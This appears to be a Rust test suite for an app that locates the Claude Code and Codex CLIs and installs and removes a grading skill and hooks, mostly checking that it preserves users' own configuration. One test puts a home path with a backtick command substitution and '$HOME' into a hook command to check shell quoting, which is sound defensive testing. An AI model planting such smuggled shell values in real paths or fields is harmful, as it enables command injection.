    // The plugin's files are fine, and the marketplace file isn't where it should be.
    let lab = Lab::with_claude();
    plant_plugin(&install_dir(&lab, "0.4.0"));
    claude_on(&lab, SOURCE).unwrap();
    assert_eq!(saved_problem(&lab.env), Some(UNCHECKED));
    // The list fails when the install is looked at.
    let lab = Lab::with_claude();
    lab.fake("fail-list", "boom");
    claude_on(&lab, SOURCE).unwrap();
    assert_eq!(saved_problem(&lab.env), Some(UNCHECKED));
    assert!(lab.calls().iter().all(|c| !c.contains("uninstall")), "{:?}", lab.calls());
    // A check that can be made ends it, at launch or on a new Turn on.
    let lab = Lab::with_claude();
    installed_at(&lab, "0.5.0", &ours_at("v0.5.0"));
    lab.fake("plugins.json", LIST_WITHOUT_PATH);
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(UNCHECKED));
    checkable(&lab, "0.5.0");
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Fine);
    assert_eq!(saved_problem(&lab.env), None);
    assert_eq!(status(&lab.env, &[], None).claude_code.problem, None);
}

// ---- finding programs, once ----

/// A file that can be run, in `dir`.
fn program(dir: &Path, name: &str) -> PathBuf {
    fs::create_dir_all(dir).unwrap();
    let file = dir.join(if cfg!(windows) { format!("{name}.exe") } else { name.to_string() });
    fs::write(&file, "#!/bin/sh\n").unwrap();
    #[cfg(unix)]
    fs::set_permissions(&file, std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
    file
}

#[test]
fn a_program_is_found_in_the_folders_given_first() {
    let dir = tempfile::tempdir().unwrap();
    let exe = program(dir.path(), "tool-xyz");
    let never = |_: &str| -> Option<PathBuf> { None };
    assert_eq!(find_exe("tool-xyz", &[dir.path().to_path_buf()], &never), Some(exe));
    assert_eq!(find_exe("no-such-tool-xyz", &[dir.path().to_path_buf()], &never), None);
}

#[test]
fn the_shell_is_asked_only_when_the_folders_have_nothing() {
    let dir = tempfile::tempdir().unwrap();
    let exe = program(dir.path(), "tool-xyz");
    let asked = std::cell::Cell::new(0);
    let shell = |name: &str| {
        asked.set(asked.get() + 1);
        Some(PathBuf::from(format!("/from/the/shell/{name}")))
    };
    assert_eq!(find_exe("tool-xyz", &[dir.path().to_path_buf()], &shell), Some(exe));
    assert_eq!(asked.get(), 0);
    assert_eq!(find_exe("no-such-tool-xyz", &[], &shell), Some(PathBuf::from("/from/the/shell/no-such-tool-xyz")));
    assert_eq!(asked.get(), 1);
}

#[test]
fn a_program_found_once_is_not_looked_for_again() {
    let dir = tempfile::tempdir().unwrap();
    let exe = program(dir.path(), "tool-xyz");
    let cache = Mutex::new(Vec::new());
    let looks = std::cell::Cell::new(0);
    let shell = |_: &str| {
        looks.set(looks.get() + 1);
        None
    };
    let folders = [dir.path().to_path_buf()];
    assert_eq!(find_cached(&cache, "tool-xyz", &folders, &shell), Some(exe.clone()));
    // Remembered: no folders to search any more, and still found.
    assert_eq!(find_cached(&cache, "tool-xyz", &[], &shell), Some(exe.clone()));
    // A program that isn't there isn't remembered, so the next look (with the shell) can find it.
    assert_eq!(find_cached(&cache, "no-such-tool-xyz", &[], &shell), None);
    assert_eq!(looks.get(), 1);
    let from_shell = |_: &str| Some(exe.clone());
    assert_eq!(find_cached(&cache, "no-such-tool-xyz", &[], &from_shell), Some(exe.clone()));
    // One that has gone is looked for again.
    fs::remove_file(&exe).unwrap();
    assert_eq!(find_cached(&cache, "tool-xyz", &[], &shell), None);
}

/// A home folder with `claude` in each of the places version managers and the desktop app put it.
fn home_with_claude_at(places: &[&str]) -> (TempDir, Vec<PathBuf>) {
    let home = tempfile::tempdir().unwrap();
    let files = places.iter().map(|place| program(&home.path().join(place), "claude")).collect();
    (home, files)
}

fn never(_: &str) -> Option<PathBuf> {
    None
}

#[test]
fn claude_is_found_in_every_place_version_managers_and_package_managers_keep_it() {
    for place in [
        ".volta/bin",
        ".asdf/shims",
        ".bun/bin",
        ".npm-global/bin",
        ".nvm/versions/node/v20.11.0/bin",
        ".local/share/fnm/node-versions/v20.11.0/installation/bin",
        ".local/bin",
        ".claude/local",
    ] {
        let (home, files) = home_with_claude_at(&[place]);
        let dirs = dirs_for(home.path(), false, false);
        assert_eq!(find_exe("claude", &dirs, &never), Some(files[0].clone()), "{place}");
    }
}

#[test]
fn the_newest_node_version_wins_in_nvm_and_fnm() {
    let (home, files) = home_with_claude_at(&[
        ".nvm/versions/node/v9.0.0/bin",
        ".nvm/versions/node/v20.9.0/bin",
        ".nvm/versions/node/v20.11.0/bin",
        ".nvm/versions/node/v18.20.4/bin",
    ]);
    let dirs = dirs_for(home.path(), false, false);
    assert_eq!(find_exe("claude", &dirs, &never), Some(files[2].clone()), "20.11.0, not 20.9.0 or 9.0.0");
    let (home, files) = home_with_claude_at(&[
        ".local/share/fnm/node-versions/v18.0.0/installation/bin",
        ".local/share/fnm/node-versions/v22.2.0/installation/bin",
    ]);
    assert_eq!(find_exe("claude", &dirs_for(home.path(), false, false), &never), Some(files[1].clone()));
}

#[test]
fn a_place_the_person_chose_beats_a_version_manager_and_the_desktop_app_comes_last() {
    let (home, files) = home_with_claude_at(&[
        "Library/Application Support/Claude/claude-code/2.1.0/abc/claude.app/Contents/MacOS",
        ".nvm/versions/node/v20.11.0/bin",
        ".local/bin",
    ]);
    let dirs = dirs_for(home.path(), false, true);
    assert_eq!(find_exe_in("claude", &dirs, &[], &never), Some(files[2].clone()), "~/.local/bin first");
    fs::remove_file(&files[2]).unwrap();
    assert_eq!(find_exe_in("claude", &dirs, &[], &never), Some(files[1].clone()), "then nvm");
    fs::remove_file(&files[1]).unwrap();
    assert_eq!(find_exe_in("claude", &dirs, &[], &never), Some(files[0].clone()), "then the desktop app's");
}

#[test]
fn the_desktop_apps_claude_code_is_looked_for_on_macos_only_and_the_highest_version_that_can_run_wins() {
    let app = "Library/Application Support/Claude/claude-code";
    let (home, files) = home_with_claude_at(&[
        &format!("{app}/2.1.9/aaa/claude.app/Contents/MacOS"),
        &format!("{app}/2.1.10/bbb/claude.app/Contents/MacOS"),
        &format!("{app}/2.0.99/ccc/claude.app/Contents/MacOS"),
    ]);
    let dirs = dirs_for(home.path(), false, true);
    assert_eq!(find_exe_in("claude", &dirs, &[], &never), Some(files[1].clone()), "2.1.10, not 2.1.9");
    #[cfg(unix)]
    {
        // The newest isn't runnable (a download that didn't finish): the next one down is.
        fs::set_permissions(&files[1], std::os::unix::fs::PermissionsExt::from_mode(0o644)).unwrap();
        assert_eq!(find_exe_in("claude", &dirs, &[], &never), Some(files[0].clone()), "2.1.9");
    }
    fs::remove_file(&files[1]).unwrap();
    fs::remove_file(&files[0]).unwrap();
    assert_eq!(find_exe_in("claude", &dirs, &[], &never), Some(files[2].clone()), "2.0.99");
    // Anywhere else it isn't looked for at all, and neither is Windows' list any longer than it was.
    assert!(!dirs_for(home.path(), false, false).iter().any(|d| d.starts_with(home.path().join(app))));
    assert_eq!(dirs_for(home.path(), true, true), [home.path().join(".local").join("bin")]);
}

#[test]
fn a_file_that_cannot_be_run_is_not_a_program() {
    #[cfg(unix)]
    {
        let dir = tempfile::tempdir().unwrap();
        fs::write(dir.path().join("tool-xyz-not-runnable"), "not runnable").unwrap();
        assert_eq!(find_exe("tool-xyz-not-runnable", &[dir.path().to_path_buf()], &never), None);
    }
}

#[test]
fn where_claude_was_found_is_saved_for_the_launches_that_follow() {
    let tmp = tempfile::tempdir().unwrap();
    let data = tmp.path().join("data");
    let elsewhere = program(&tmp.path().join("shell-knows"), "claude");
    // Turn on or Look again: found (wherever), and saved.
    let found = find_claude(&data, &Mutex::new(Vec::new()), &[tmp.path().join("shell-knows")], &never, true);
    assert_eq!(found, Some(elsewhere.clone()));
    assert_eq!(finding::saved(&data), Some(elsewhere.clone()));
    // A launch: no folders, no shell, a fresh run. The saved path is what finds it, whatever is on PATH.
    assert_eq!(find_claude(&data, &Mutex::new(Vec::new()), &[], &never, false), Some(elsewhere.clone()));
    // It goes first, ahead of the usual places.
    let usual = program(&tmp.path().join("usual"), "claude");
    assert_eq!(
        find_claude(&data, &Mutex::new(Vec::new()), &[tmp.path().join("usual")], &never, false),
        Some(elsewhere)
    );
    // Once it is gone the usual places find the next one, and a launch does not save anything.
    fs::remove_file(finding::saved(&data).unwrap()).unwrap();
    let usual_dirs = [tmp.path().join("usual")];
    assert_eq!(find_claude(&data, &Mutex::new(Vec::new()), &usual_dirs, &never, false), Some(usual.clone()));
    assert!(
        fs::read_to_string(data.join("report-cards-claude")).unwrap().contains("shell-knows"),
        "a launch saves nothing"
    );
    // Pressing Look again does, and from then on that is the one.
    assert_eq!(find_claude(&data, &Mutex::new(Vec::new()), &usual_dirs, &never, true), Some(usual.clone()));
    assert_eq!(finding::saved(&data), Some(usual));
}

#[test]
fn a_claude_that_only_the_login_shell_knows_is_saved_and_then_found_without_it() {
    let tmp = tempfile::tempdir().unwrap();
    let data = tmp.path().join("data");
    let nvm = program(&tmp.path().join("nvm/bin"), "claude");
    let asked = std::cell::Cell::new(0);
    let shell = |name: &str| {
        asked.set(asked.get() + 1);
        (name == "claude").then(|| nvm.clone())
    };
    // The folders have no `claude` of their own. (PATH might, on a computer with one; the shell's answer is
    // asked for only if not, so either way what is found is what is saved.)
    let found = find_claude(&data, &Mutex::new(Vec::new()), &[], &shell, true).unwrap();
    assert_eq!(finding::saved(&data), Some(found.clone()));
    let before = asked.get();
    assert_eq!(find_claude(&data, &Mutex::new(Vec::new()), &[], &shell, false), Some(found));
    assert_eq!(asked.get(), before, "the saved path is used before anyone is asked");
}

// ---- Codex: the skill ----

#[test]
fn the_shipped_skill_becomes_a_codex_skill() {
    let out = codex_skill(include_str!("../../../../plugins/grade/skills/me/SKILL.md")).unwrap();
    assert!(out.starts_with("---\nname: grade-me\ndescription: "), "{}", &out[..80]);
    let front = out.split("\n---\n").next().unwrap();
    assert!(front.contains("$grade-me") && !front.contains("/grade:me"), "{front}");
    assert!(!front.contains("allowed-tools") && !front.contains("argument-hint"), "{front}");
    assert!(out.contains("Look for the chat summary No, Actually... added to this request; it starts with \"noactually digest v1\". If there isn't one, the app isn't running.\n"));
    assert!(out.contains("Request: whatever the person typed after $grade-me"));
    assert!(
        !out.contains("!`") && !out.contains("${CLAUDE_") && !out.contains("$ARGUMENTS") && !out.contains("/grade:me")
    );
    // Everything else is the shipped text.
    assert!(out.contains("# Report card\n") && out.contains("```noactually\n"));
}

#[test]
fn a_skill_with_windows_line_endings_becomes_the_same_codex_skill() {
    let unix = include_str!("../../../../plugins/grade/skills/me/SKILL.md").replace("\r\n", "\n");
    let windows = unix.replace('\n', "\r\n");
    assert!(windows.contains("\r\n") && !unix.contains('\r'));
    let from_windows = codex_skill(&windows).unwrap();
    assert_eq!(from_windows, codex_skill(&unix).unwrap(), "the same text either way");
    assert!(!from_windows.contains('\r'), "no carriage return gets through");
    assert!(from_windows.starts_with("---\nname: grade-me\ndescription: "));
}

#[test]
fn a_skill_our_editor_saved_with_windows_line_endings_is_still_ours() {
    let lab = Lab::new();
    turn_on(&lab.env, Tool::Codex, "").unwrap();
    let file = lab.skill_dir().join("SKILL.md");
    let ours = fs::read_to_string(&file).unwrap();
    fs::write(&file, ours.replace('\n', "\r\n")).unwrap();
    turn_on(&lab.env, Tool::Codex, "").unwrap();
    assert_eq!(fs::read_to_string(&file).unwrap(), ours, "put back as we write it");
    fs::write(&file, ours.replace('\n', "\r\n")).unwrap();
    turn_off(&lab.env, Tool::Codex).unwrap();
    assert!(!lab.skill_dir().exists(), "and it can be turned off");
}

#[test]
fn the_codex_names_come_from_the_sources_crate() {
    assert_eq!(sources::GRADE_SKILL_CODEX, "$grade-me");
    assert_eq!(sources::GRADE_COMMAND, "/grade:me");
    // The skill folder, and the text that finds our hooks again, are spelled with the skill's name.
    let name = sources::GRADE_SKILL_CODEX.trim_start_matches('$');
    assert_eq!(HOOK_MARK, format!("/.agents/skills/{name}/scripts/na"));
    let lab = Lab::new();
    assert_eq!(lab.skill_dir(), lab.env.home.join(".agents/skills").join(name));
}

#[test]
fn a_skill_edit_that_moves_a_marker_is_an_error_not_a_quiet_break() {
    let good = "---\ndescription: Type /grade:me for a card\nargument-hint: \"[all]\"\nallowed-tools: Bash(x)\n---\n\nRequest: $ARGUMENTS\n\n!`run it`\n\nBye\n";
    let out = codex_skill(good).unwrap();
    assert!(out.starts_with("---\nname: grade-me\ndescription: Type $grade-me for a card\n---\n"), "{out}");
    let cases = [
        ("no front matter", good.replacen("---\n", "", 1)),
        ("front matter never ends", good.replacen("\n---\n", "\n", 1)),
        ("description", good.replace("Type /grade:me", "Type it")),
        ("allowed-tools", good.replace("allowed-tools:", "tools:")),
        ("argument-hint", good.replace("argument-hint:", "hint:")),
        ("digest", good.replace("!`run it`", "run it")),
        ("Request", good.replace("Request: $ARGUMENTS", "Request: $ARGS")),
    ];
    for (what, edited) in cases {
        let e = codex_skill(&edited).unwrap_err();
        assert!(e.contains(what) || what.contains("front matter") && e.contains("front matter"), "{what}: {e}");
    }
    // Claude Code wording that survives the rewrite is caught too.
    let e = codex_skill(&good.replace("Bye", "Use ${CLAUDE_PLUGIN_ROOT}")).unwrap_err();
    assert!(e.contains("Claude Code wording"), "{e}");
}

// ---- Codex: files and hooks ----

fn pretty(v: &serde_json::Value) -> String {
    format!("{}\n", serde_json::to_string_pretty(v).unwrap())
}

/// Someone else's hooks file: other tools' hooks, an empty event, odd key order, extra keys.
fn their_hooks() -> serde_json::Value {
    serde_json::from_str(
        r#"{
  "zeta": {"b": 1, "a": [true, null, 2.5]},
  "hooks": {
    "Stop": [{"matcher": "x", "hooks": [{"type": "command", "command": "/usr/local/bin/their-stop", "timeout": 3}]}],
    "SessionStart": [],
    "PreToolUse": [{"hooks": [{"type": "command", "command": "echo hi"}, {"type": "command", "command": "echo two"}]}]
  },
  "alpha": "last"
}"#,
    )
    .unwrap()
}

#[test]
fn codex_comes_on_and_off_leaving_everyone_elses_hooks_as_they_were() {
    let lab = Lab::new();
    // `preserve_order` isn't on in this workspace, so this text is the file's own key order.
    let theirs = r#"{
  "zeta": {
    "b": 1,
    "a": [
      true,
      null,
      2.5
    ]
  },
  "hooks": {
    "Stop": [
      {
        "matcher": "x",
        "hooks": [
          {
            "type": "command",
            "command": "/usr/local/bin/their-stop",
            "timeout": 3
          }
        ]
      }
    ],
    "SessionStart": [],
    "PreToolUse": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "echo hi"
          },
          {
            "type": "command",
            "command": "echo two"
          }
        ]
      }
    ]
  },
  "alpha": "last"
}
"#;
    fs::write(lab.hooks(), theirs).unwrap();
    turn_on(&lab.env, Tool::Codex, "").unwrap();

    let [(name, backup)] = &lab.backups()[..] else { panic!("{:?}", lab.backups()) };
    assert_eq!(backup, theirs, "the backup is the file as it was");
    let stamp = name.strip_prefix("hooks.json.bak-").unwrap();
    assert!(
        stamp.len() == 15 && stamp.as_bytes()[8] == b'-' && stamp.bytes().filter(u8::is_ascii_digit).count() == 14,
        "named with the date and time: {name}"
    );
    let now = fs::read_to_string(lab.hooks()).unwrap();
    let after: serde_json::Value = serde_json::from_str(&now).unwrap();
    let before = their_hooks();
    // Their keys are where they were, in their order.
    let keys = |v: &serde_json::Value| now_keys(&now, v);
    assert_eq!(keys(&after), ["zeta", "hooks", "alpha"]);
    assert_eq!(after["zeta"], before["zeta"]);
    assert_eq!(after["alpha"], before["alpha"]);
    assert_eq!(after["hooks"]["PreToolUse"], before["hooks"]["PreToolUse"]);
    assert_eq!(after["hooks"]["SessionStart"], before["hooks"]["SessionStart"]);
    assert_eq!(after["hooks"]["Stop"][0], before["hooks"]["Stop"][0], "their Stop hook is untouched and still first");
    assert!(
        now.find("\"Stop\"").unwrap() < now.find("\"SessionStart\"").unwrap()
            && now.find("\"SessionStart\"").unwrap() < now.find("\"PreToolUse\"").unwrap()
    );
    // Ours, in the shape Claude Code uses.
    let home = lab.env.home.to_string_lossy();
    let shim = format!("\"{home}/.agents/skills/grade-me/scripts/na\"");
    assert_eq!(
        after["hooks"]["UserPromptSubmit"],
        serde_json::json!([{"hooks": [{"type": "command", "command": format!("{shim} hook codex-prompt"), "timeout": 10}]}])
    );
    assert_eq!(
        after["hooks"]["Stop"][1],
        serde_json::json!({"hooks": [{"type": "command", "command": format!("{shim} hook codex-stop"), "timeout": 5}]})
    );
    assert!(status(&lab.env, &[], None).codex.on);

    turn_off(&lab.env, Tool::Codex).unwrap();
    assert_eq!(fs::read_to_string(lab.hooks()).unwrap(), theirs, "byte for byte what they had");
    assert!(!status(&lab.env, &[], None).codex.on);
    assert!(!lab.skill_dir().exists(), "our folder is gone");
    let backups = lab.backups();
    assert_eq!(backups.len(), 2, "taking ours out copies the file first too: {backups:?}");
    assert!(backups[1].1.contains(HOOK_MARK), "the second copy is the file with our hooks in it");
}

fn now_keys(text: &str, v: &serde_json::Value) -> Vec<String> {
    // Top-level keys in the order they appear in the text (one per line at two spaces).
    let mut keys: Vec<String> =
        text.lines().filter_map(|l| l.strip_prefix("  \"")?.split('"').next().map(str::to_string)).collect();
    keys.retain(|k| v.get(k).is_some());
    keys
}

#[test]
fn a_fresh_home_is_back_to_how_it_was_after_turning_off() {
    let lab = Lab::new();
    let before = lab.tree();
    turn_on(&lab.env, Tool::Codex, "").unwrap();
    assert_eq!(
        lab.tree(),
        [
            ".agents/",
            ".agents/skills/",
            ".agents/skills/grade-me/",
            ".agents/skills/grade-me/SKILL.md",
            ".agents/skills/grade-me/scripts/",
            ".agents/skills/grade-me/scripts/na",
            ".codex/",
            ".codex/hooks.json"
        ]
    );
    assert!(status(&lab.env, &[], None).codex.on);
    turn_off(&lab.env, Tool::Codex).unwrap();
    // The folders around ours are not ours to remove, even empty.
    let mut kept = before.clone();
    kept.extend([".agents/".into(), ".agents/skills/".into()]);
    kept.sort();
    assert_eq!(lab.tree(), kept, "no hooks file, no skill folder");
    assert!(!status(&lab.env, &[], None).codex.on);
}

#[test]
fn turning_off_leaves_other_agents_files_alone() {
    let lab = Lab::new();
    fs::create_dir_all(lab.env.home.join(".agents/skills/other")).unwrap();
    fs::write(lab.env.home.join(".agents/AGENTS.md"), "mine").unwrap();
    turn_on(&lab.env, Tool::Codex, "").unwrap();
    fs::write(lab.skill_dir().join("notes.txt"), "the person's own file").unwrap();
    turn_off(&lab.env, Tool::Codex).unwrap();
    assert!(lab.env.home.join(".agents/skills/other").is_dir() && lab.env.home.join(".agents/AGENTS.md").is_file());
    assert!(lab.skill_dir().join("notes.txt").is_file(), "a folder with someone's file in it stays");
    assert!(!lab.skill_dir().join("SKILL.md").exists() && !lab.skill_dir().join("scripts").exists());
}

#[test]
fn every_change_to_an_existing_hooks_file_gets_its_own_copy() {
    let lab = Lab::new();
    let theirs = pretty(&their_hooks());
    fs::write(lab.hooks(), &theirs).unwrap();
    turn_on(&lab.env, Tool::Codex, "").unwrap();
    turn_off(&lab.env, Tool::Codex).unwrap();
    turn_on(&lab.env, Tool::Codex, "").unwrap();
    turn_off(&lab.env, Tool::Codex).unwrap();
    let backups = lab.backups();
    assert_eq!(backups.len(), 4, "{backups:?}");
    let names: std::collections::HashSet<_> = backups.iter().map(|(n, _)| n).collect();
    assert_eq!(names.len(), 4, "a copy made in the same second never replaces another");
    assert_eq!(backups[0].1, theirs, "the oldest is the person's own file");
}

#[test]
fn the_skill_says_it_is_ours_and_a_skill_without_that_is_never_touched() {
    let lab = Lab::new();
    let skill = lab.skill_dir().join("SKILL.md");
    fs::create_dir_all(lab.skill_dir()).unwrap();
    for theirs in [
        "mine",
        "---\nname: grade-me\n---\nTheir own grade-me.\n",
        "---\nname: x\n---\nNote: <!-- installed by No, Actually... -->\n",
    ] {
        fs::write(&skill, theirs).unwrap();
        fs::write(lab.hooks(), pretty(&their_hooks())).unwrap();
        let msg = "There's already a Codex skill called grade-me (~/.agents/skills/grade-me) that isn't from this app. Rename or remove it, then try again.";
        assert_eq!(turn_on(&lab.env, Tool::Codex, "").unwrap_err(), msg, "{theirs:?}");
        assert_eq!(fs::read_to_string(&skill).unwrap(), theirs, "left as it was");
        assert_eq!(fs::read_to_string(lab.hooks()).unwrap(), pretty(&their_hooks()), "no hooks added either");
        assert!(lab.backups().is_empty() && !lab.skill_dir().join("scripts").exists());
        // Turning off doesn't remove what isn't ours.
        turn_off(&lab.env, Tool::Codex).unwrap();
        assert_eq!(fs::read_to_string(&skill).unwrap(), theirs);
    }
    // Our own, from an earlier turn on, is replaced.
    fs::remove_file(&skill).unwrap();
    fs::write(lab.hooks(), "").unwrap();
    turn_on(&lab.env, Tool::Codex, "").unwrap();
    let ours = fs::read_to_string(&skill).unwrap();
    assert!(ours.split("\n---\n").nth(1).unwrap().starts_with("<!-- installed by No, Actually... -->\n"), "{ours}");
    turn_on(&lab.env, Tool::Codex, "").unwrap();
    turn_off(&lab.env, Tool::Codex).unwrap();
    assert!(!skill.exists());
}

#[test]
fn turning_off_never_removes_the_folders_around_ours() {
    let lab = Lab::new();
    turn_on(&lab.env, Tool::Codex, "").unwrap();
    turn_off(&lab.env, Tool::Codex).unwrap();
    assert!(lab.env.home.join(".agents/skills").is_dir(), "empty, but not ours to remove");
    assert!(!lab.skill_dir().exists());
}

#[test]
fn turning_on_twice_changes_nothing_the_second_time() {
    let lab = Lab::new();
    let theirs = pretty(&their_hooks());
    fs::write(lab.hooks(), &theirs).unwrap();
    turn_on(&lab.env, Tool::Codex, "").unwrap();
    let (hooks, skill) =
        (fs::read_to_string(lab.hooks()).unwrap(), fs::read_to_string(lab.skill_dir().join("SKILL.md")).unwrap());
    turn_on(&lab.env, Tool::Codex, "").unwrap();
    assert_eq!(fs::read_to_string(lab.hooks()).unwrap(), hooks);
    assert_eq!(fs::read_to_string(lab.skill_dir().join("SKILL.md")).unwrap(), skill);
    let backups = lab.backups();
    assert_eq!(backups.len(), 1, "nothing changed, so nothing more to copy");
    assert_eq!(backups[0].1, theirs, "the backup is the original, not our own output");
    assert_eq!(hooks.matches(HOOK_MARK).count(), 2, "one entry per event");
    turn_off(&lab.env, Tool::Codex).unwrap();
    assert_eq!(fs::read_to_string(lab.hooks()).unwrap(), theirs);
}

#[test]
fn our_entries_are_updated_in_place_and_repeats_are_dropped() {
    let lab = Lab::new();
    let old = |cmd: &str| serde_json::json!({"type": "command", "command": cmd, "timeout": 99});
    fs::write(
        lab.hooks(),
        pretty(&serde_json::json!({"hooks": {"Stop": [
            {"hooks": [old("\"/old/home/.agents/skills/grade-me/scripts/na\" hook codex-stop"), old("keep me")]},
            {"hooks": [old("\"/older/.agents/skills/grade-me/scripts/na\" hook codex-stop")]},
        ]}})),
    )
    .unwrap();
    turn_on(&lab.env, Tool::Codex, "").unwrap();
    let after: serde_json::Value = serde_json::from_str(&fs::read_to_string(lab.hooks()).unwrap()).unwrap();
    let stop = after["hooks"]["Stop"].as_array().unwrap();
    assert_eq!(stop.len(), 1, "the group that held only a repeat is gone");
    let inner = stop[0]["hooks"].as_array().unwrap();
    assert_eq!(inner.len(), 2);
    assert!(
        inner[0]["command"].as_str().unwrap().contains(&*lab.env.home.to_string_lossy()),
        "updated in place, first"
    );
    assert_eq!(inner[0]["timeout"], 5);
    assert_eq!(inner[1]["command"], "keep me");
    assert_eq!(lab.backups().len(), 1, "changing the file at all copies it first, even when our hooks were in it");
}

#[test]
fn a_hooks_file_that_is_not_json_is_never_overwritten() {
    let lab = Lab::new();
    fs::write(lab.hooks(), "{ // my notes\n  \"hooks\": {}\n}").unwrap();
    let msg = "Couldn't read your Codex hooks file (~/.codex/hooks.json). Fix it, then try again.";
    assert_eq!(turn_on(&lab.env, Tool::Codex, "").unwrap_err(), msg);
    assert_eq!(turn_off(&lab.env, Tool::Codex).unwrap_err(), msg);
    assert_eq!(fs::read_to_string(lab.hooks()).unwrap(), "{ // my notes\n  \"hooks\": {}\n}");
    assert!(!lab.env.home.join(".agents").exists(), "nothing was written");
    assert_eq!(lab.backups().len(), 0, "no copy was made");
    for wrong in ["[]", r#"{"hooks": []}"#, r#"{"hooks": {"Stop": {}}}"#, "null"] {
        fs::write(lab.hooks(), wrong).unwrap();
        assert_eq!(turn_on(&lab.env, Tool::Codex, "").unwrap_err(), msg, "{wrong}");
        assert_eq!(fs::read_to_string(lab.hooks()).unwrap(), wrong);
    }
}

#[test]
fn an_empty_hooks_file_is_just_a_new_one() {
    let lab = Lab::new();
    fs::write(lab.hooks(), "  \n").unwrap();
    turn_on(&lab.env, Tool::Codex, "").unwrap();
    assert!(status(&lab.env, &[], None).codex.on);
    turn_off(&lab.env, Tool::Codex).unwrap();
    assert!(!lab.hooks().exists());
}

#[test]
fn without_codex_there_is_nothing_to_turn_on() {
    let mut lab = Lab::new();
    fs::remove_dir(lab.env.home.join(".codex")).unwrap();
    assert!(!status(&lab.env, &[], None).codex.installed_tool);
    assert_eq!(turn_on(&lab.env, Tool::Codex, "").unwrap_err(), "Codex isn't installed.");
    assert!(!lab.env.home.join(".agents").exists());
    lab.env.codex = Some("/somewhere/codex".into());
    assert!(status(&lab.env, &[], None).codex.installed_tool, "a command is enough");
}

#[cfg(unix)]
#[test]
fn the_shim_can_be_run_and_the_files_are_ordinary() {
    use std::os::unix::fs::PermissionsExt;
    let lab = Lab::new();
    turn_on(&lab.env, Tool::Codex, "").unwrap();
    let mode = |p: &Path| fs::metadata(p).unwrap().permissions().mode() & 0o777;
    assert_eq!(mode(&lab.skill_dir().join("scripts/na")), 0o755);
    assert_eq!(mode(&lab.skill_dir().join("SKILL.md")), 0o644);
    assert_eq!(
        fs::read_to_string(lab.skill_dir().join("scripts/na")).unwrap(),
        include_str!("../../../../plugins/grade/bin/na")
    );
    // A new hooks file isn't world-writable, and nothing is left half-written.
    assert_eq!(mode(&lab.hooks()), 0o644);
    assert!(lab.tree().iter().all(|f| !f.contains(".tmp")), "{:?}", lab.tree());
}

#[cfg(unix)]
#[test]
fn a_symlinked_hooks_file_stays_a_symlink_and_the_target_is_updated() {
    use std::os::unix::fs::{symlink, PermissionsExt};
    let lab = Lab::new();
    let target = lab.dir.path().join("dotfiles/hooks.json");
    fs::create_dir_all(target.parent().unwrap()).unwrap();
    fs::write(&target, pretty(&their_hooks())).unwrap();
    fs::set_permissions(&target, fs::Permissions::from_mode(0o600)).unwrap();
    symlink(&target, lab.hooks()).unwrap();
    turn_on(&lab.env, Tool::Codex, "").unwrap();
    assert!(fs::symlink_metadata(lab.hooks()).unwrap().file_type().is_symlink());
    assert!(fs::read_to_string(&target).unwrap().contains(HOOK_MARK));
    assert_eq!(fs::metadata(&target).unwrap().permissions().mode() & 0o777, 0o600, "its permissions are kept");
    turn_off(&lab.env, Tool::Codex).unwrap();
    assert_eq!(fs::read_to_string(&target).unwrap(), pretty(&their_hooks()));
}

#[test]
fn hooks_keep_their_order_through_the_reader_and_writer() {
    let text = r#"{"b":1,"a":{"z":[1,{"y":null,"x":true}],"c":"é \"q\" \\"},"n":-3,"f":0.5}"#;
    let json: Json = serde_json::from_str(text).unwrap();
    assert_eq!(serde_json::to_string(&json).unwrap(), text);
    assert!(serde_json::from_str::<Json>("{").is_err());
}

#[test]
fn a_home_folder_with_odd_characters_is_quoted_for_the_shell() {
    let mut lab = Lab::new();
    lab.env.home = PathBuf::from("/Users/Ann Lee/$HOME`x`\"q\"/");
    let cmd = hook_command(&lab.env, "codex-stop");
    if cfg!(unix) {
        assert_eq!(cmd, r#""/Users/Ann Lee/\$HOME\`x\`\"q\"/.agents/skills/grade-me/scripts/na" hook codex-stop"#);
    }
    assert!(cmd.contains(HOOK_MARK) || cfg!(windows));
}

// ---- status, automatic grading, and the window's shapes ----

// ---- Codex: after an app update ----

const SKILL_FILE: &str = include_str!("../../../../plugins/grade/skills/me/SKILL.md");
const SHIM_FILE: &str = include_str!("../../../../plugins/grade/bin/na");

/// Codex turned on by this app, then made to look as an older app version left it: an older skill and
/// shim, and hooks that run the shim from another place (with a timeout and a key we don't set).
fn codex_from_an_older_app(lab: &Lab) {
    fs::write(lab.hooks(), pretty(&their_hooks())).unwrap();
    turn_on(&lab.env, Tool::Codex, "").unwrap();
    let skill = lab.skill_dir().join("SKILL.md");
    fs::write(&skill, format!("{}\nAn older line.\n", fs::read_to_string(&skill).unwrap())).unwrap();
    fs::write(lab.skill_dir().join("scripts/na"), "#!/bin/sh\necho older\n").unwrap();
    let mut hooks: serde_json::Value = serde_json::from_str(&fs::read_to_string(lab.hooks()).unwrap()).unwrap();
    for event in ["UserPromptSubmit", "Stop"] {
        let ours = hooks["hooks"][event].as_array_mut().unwrap().iter_mut().find_map(|g| {
            g["hooks"].as_array_mut()?.iter_mut().find(|h| h["command"].as_str().is_some_and(|c| c.contains(HOOK_MARK)))
        });
        let ours = ours.unwrap();
        ours["command"] =
            serde_json::json!(format!("\"/Users/older/.agents/skills/grade-me/scripts/na\" hook {event}"));
        ours["timeout"] = serde_json::json!(99);
        ours["statusMessage"] = serde_json::json!("Grading");
    }
    fs::write(lab.hooks(), pretty(&hooks)).unwrap();
}

#[test]
fn an_app_update_rewrites_the_codex_files_it_wrote_and_changes_nothing_else() {
    let lab = Lab::new();
    codex_from_an_older_app(&lab);
    let before: serde_json::Value = serde_json::from_str(&fs::read_to_string(lab.hooks()).unwrap()).unwrap();
    let backups_before = lab.backups().len();
    assert_eq!(refresh(&lab.env), Ok(true));
    assert_eq!(fs::read_to_string(lab.skill_dir().join("SKILL.md")).unwrap(), codex_skill(SKILL_FILE).unwrap());
    assert_eq!(fs::read_to_string(lab.skill_dir().join("scripts/na")).unwrap(), lf(SHIM_FILE));
    let after: serde_json::Value = serde_json::from_str(&fs::read_to_string(lab.hooks()).unwrap()).unwrap();
    for (event, arg) in [("UserPromptSubmit", "codex-prompt"), ("Stop", "codex-stop")] {
        let ours = |v: &serde_json::Value| {
            v["hooks"][event]
                .as_array()
